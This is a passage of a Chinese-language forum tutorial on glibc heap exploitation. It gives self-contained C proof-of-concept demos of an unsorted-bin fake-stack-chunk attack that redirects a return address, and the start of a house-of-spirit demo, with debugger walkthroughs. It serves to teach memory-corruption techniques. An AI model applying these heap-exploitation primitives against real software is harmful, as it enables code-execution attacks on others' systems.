
```
#include 
#include 
#include 
#include 
#include 

void jackpot(){ printf("Nice jump d00d\n"); exit(0); }

int main() {
    intptr_t stack_buffer[4] = {0};

    printf("Allocating the victim chunk\n");
    intptr_t* victim = malloc(0x100);

    printf("Allocating another chunk to avoid consolidating the top chunk with the small one during the free()\n");
    intptr_t* p1 = malloc(0x100);

    printf("Freeing the chunk %p, it will be inserted in the unsorted bin\n", victim);
    free(victim);

    printf("Create a fake chunk on the stack");
    printf("Set size for next allocation and the bk pointer to any writable address");
    stack_buffer[1] = 0x100 + 0x10;
    stack_buffer[3] = (intptr_t)stack_buffer;

    //------------VULNERABILITY-----------
    printf("Now emulating a vulnerability that can overwrite the victim->size and victim->bk pointer\n");
    printf("Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (> 16 on x64) && system_mem\n");
    victim[-1] = 32;
    victim[1] = (intptr_t)stack_buffer; // victim->bk is pointing to stack
    //------------------------------------

    printf("Now next malloc will return the region of our fake chunk: %p\n", &stack_buffer[2]);
    char *p2 = malloc(0x100);
    printf("malloc(0x100): %p\n", p2);

    intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode
    memcpy((p2+40), &sc, 8); // This bypasses stack-smash detection since it jumps over the canary

    assert((long)__builtin_return_address(0) == (long)jackpot);
}

```

使用`ubuntu16.04`编译，然后使用`pwncli`改写`rpath`。

## 4> 调试

首先申请两个堆块

第一次申请的`0x100`大小的堆块给了`[rbp+ptr]`。第二个`0x100`是阻断`topchunk`。

![](https://attach.52pojie.cn/forum/202310/14/114934lbfuujbuzb72l2ub.png)

958172_SKW8ZP7TMRGT4KH.png (14.64 KB, 下载次数: 1)

[href="forum.php?mod=attachment&aid=MjY0ODk1Nnw5Y2M2NWM1NHwxNzkzNTczMDc3fDE2ODA4NnwxODQ0Mjg0&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjY0ODk1Nnw5Y2M2NWM1NHwxNzkzNTczMDc3fDE2ODA4NnwxODQ0Mjg0&nothumb=yes)

19

2023-10-14 11:49 上传

接下来`free(ptr)`，把`ptr`放入`unsorted bin`中。

![](https://attach.52pojie.cn/forum/202310/14/114949rhgrhyurhn5ccffz.png)

958172_M9SHEHDCSMPZBD7.png (16.07 KB, 下载次数: 2)

[href="forum.php?mod=attachment&aid=MjY0ODk1N3w4N2I3NmM4YnwxNzkzNTczMDc3fDE2ODA4NnwxODQ0Mjg0&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjY0ODk1N3w4N2I3NmM4YnwxNzkzNTczMDc3fDE2ODA4NnwxODQ0Mjg0&nothumb=yes)

20

2023-10-14 11:49 上传

在`0x4007A7`其`fd`，`bk`指向`main_arena+x58`的位置。

![](https://attach.52pojie.cn/forum/202310/14/115012nznnafj5xrjxxxxg.png)

958172_2PFN7JA5YKTQ3WJ.png (314.37 KB, 下载次数: 0)

[href="forum.php?mod=attachment&aid=MjY0ODk1OHw5NDMxZmZhYnwxNzkzNTczMDc3fDE2ODA4NnwxODQ0Mjg0&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjY0ODk1OHw5NDMxZmZhYnwxNzkzNTczMDc3fDE2ODA4NnwxODQ0Mjg0&nothumb=yes)

21

2023-10-14 11:50 上传

这里把`var_28`位置写为`0x110`。IDA里这个`var_28`中的`0x28`是16进制的偏移。

![](https://attach.52pojie.cn/forum/202310/14/115033dbspzb6s4rhslb9b.png)

958172_XUU37A7TTNM9CTE.png (1.71 KB, 下载次数: 1)

[href="forum.php?mod=attachment&aid=MjY0ODk1OXxmMjI0NmQxYXwxNzkzNTczMDc3fDE2ODA4NnwxODQ0Mjg0&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjY0ODk1OXxmMjI0NmQxYXwxNzkzNTczMDc3fDE2ODA4NnwxODQ0Mjg0&nothumb=yes)

22

2023-10-14 11:50 上传

这里把`rax`指向`ptr-8`的位置，特就是`size`处。然后将其改为`0x20`。`unsorted bin`有FIFO特性，下次申请`0x100`大小不会找到它。然后将`ptr+8`的位置指向`var_30`，也就是把`ptr`的`bk`指针指向`var_0x28+0x8`的位置（`bk`指向后进入`unsorted bin`的chunk），`var_0x28=0x110`，也就是伪造的chunk大小，`var_30`也就是`prev_size`的位置。

![](https://attach.52pojie.cn/forum/202310/14/115050r46kp9bp9dzh5yha.png)

958172_7FFXHQMZJZJ6VD9.png (15.6 KB, 下载次数: 0)

[href="forum.php?mod=attachment&aid=MjY0ODk2MHwyMGQ2M2UyZnwxNzkzNTczMDc3fDE2ODA4NnwxODQ0Mjg0&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjY0ODk2MHwyMGQ2M2UyZnwxNzkzNTczMDc3fDE2ODA4NnwxODQ0Mjg0&nothumb=yes)

23

2023-10-14 11:50 上传

在`0x40081C`下断点，可见`ptr`的`bk`指向栈。

![](https://attach.52pojie.cn/forum/202310/14/115110bdedohdvnz923fae.png)

958172_X8QF98YVC2Y7HSR.png (105.59 KB, 下载次数: 1)

[href="forum.php?mod=attachment&aid=MjY0ODk2MXxmYWI3NjNhZHwxNzkzNTczMDc3fDE2ODA4NnwxODQ0Mjg0&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjY0ODk2MXxmYWI3NjNhZHwxNzkzNTczMDc3fDE2ODA4NnwxODQ0Mjg0&nothumb=yes)

24

2023-10-14 11:51 上传

查看`0x602410`内存可见`ptr`的`size`位置被改为了`0x20`

![](https://attach.52pojie.cn/forum/202310/14/115126skp7r0gk4xep03pz.png)

958172_RNY3WYAWYJ7DY93.png (90.45 KB, 下载次数: 1)

[href="forum.php?mod=attachment&aid=MjY0ODk2MnxmOThkNDYyYnwxNzkzNTczMDc3fDE2ODA4NnwxODQ0Mjg0&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjY0ODk2MnxmOThkNDYyYnwxNzkzNTczMDc3fDE2ODA4NnwxODQ0Mjg0&nothumb=yes)

25

2023-10-14 11:51 上传

接下来申请`0x100`大小的chunk将会去`unsorted bin`寻找`0x110`大小的chunk，`ptr`已被改为`0x20`大小，所以跳过`ptr`申请到了栈上伪造的`var_30`处chunk。

![](https://attach.52pojie.cn/forum/202310/14/115141jn8cxaqbcii1mi22.png)

958172_4R6P2X9QDR3K5EQ.png (2.29 KB, 下载次数: 0)

[href="forum.php?mod=attachment&aid=MjY0ODk2M3xiODljMzhkN3wxNzkzNTczMDc3fDE2ODA4NnwxODQ0Mjg0&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjY0ODk2M3xiODljMzhkN3wxNzkzNTczMDc3fDE2ODA4NnwxODQ0Mjg0&nothumb=yes)

26

2023-10-14 11:51 上传

在`0x40082B`处下断点，可见`malloc`后，`unsorted`被整理，`0x20`大小的`ptr`放进了`small bin`。`fd`和`bk`都指向`main_arena+104`处。

![](https://attach.52pojie.cn/forum/202310/14/115159alzv1s21lvkv7zzm.png)

958172_CFQPP2ZXM4P7YKJ.png (315.01 KB, 下载次数: 2)

[href="forum.php?mod=attachment&aid=MjY0ODk2NHw5NDRkNThkOHwxNzkzNTczMDc3fDE2ODA4NnwxODQ0Mjg0&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjY0ODk2NHw5NDRkNThkOHwxNzkzNTczMDc3fDE2ODA4NnwxODQ0Mjg0&nothumb=yes)

27

2023-10-14 11:51 上传

申请成功。

## 3> house_of_spirit

### 4> 源码

```
#include 
#include 

int main()
{
    fprintf(stderr, "This file demonstrates the house of spirit attack.\n");

    fprintf(stderr, "Calling malloc() once so that it sets up its memory.\n");
    malloc(1);

    fprintf(stderr, "We will now overwrite a pointer to point to a fake 'fastbin' region.\n");
    unsigned long long *a;
    // This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)
    unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));

    fprintf(stderr, "This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n", sizeof(fake_chunks), &fake_chunks[1], &fake_chunks[9]);

    fprintf(stderr, "This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category ( 2*SIZE_SZ (> 16 on x64) && system_mem (

```

使用`ubuntu16.04`编译，然后使用`pwncli`改写`rpath`。

### 4> 调试

初始化堆。

![](https://attach.52pojie.cn/forum/202310/14/115235acyftgf56yhw19f1.png)

image-20230922091755981-1695348432658-25.png (5.52 KB, 下载次数: 1)

[href="forum.php?mod=attachment&aid=MjY0ODk2NXxiYjEzYTM5YnwxNzkzNTczMDc3fDE2ODA4NnwxODQ0Mjg0&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjY0ODk2NXxiYjEzYTM5YnwxNzkzNTczMDc3fDE2ODA4NnwxODQ0Mjg0&nothumb=yes)

28

2023-10-14 11:52 上传

在`0x400703`处下断点查看堆结构。

![](https://attach.52pojie.cn/forum/202310/14/115305fgrwg6mzrn4tq9t4.png)

image-20230922091916522-1695348571707-28.png (21.69 KB, 下载次数: 2)

[href="forum.php?mod=attachment&aid=MjY0ODk2Nnw4MmJmYzkwZnwxNzkzNTczMDc3fDE2ODA4NnwxODQ0Mjg0&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjY0ODk2Nnw4MmJmYzkwZnwxNzkzNTczMDc3fDE2ODA4NnwxODQ0Mjg0&nothumb=yes)

29

2023-10-14 11:53 上传

栈中数组结构。`fake_chunks_size = 0x40`，`fake_chunks_next_size = 0x1234`。

![](https://attach.52pojie.cn/forum/202310/14/115325y9sx5zzcb6cug771.png)

image-20230922092146583-1695348610428-32.png (95.46 KB, 下载次数: 2)
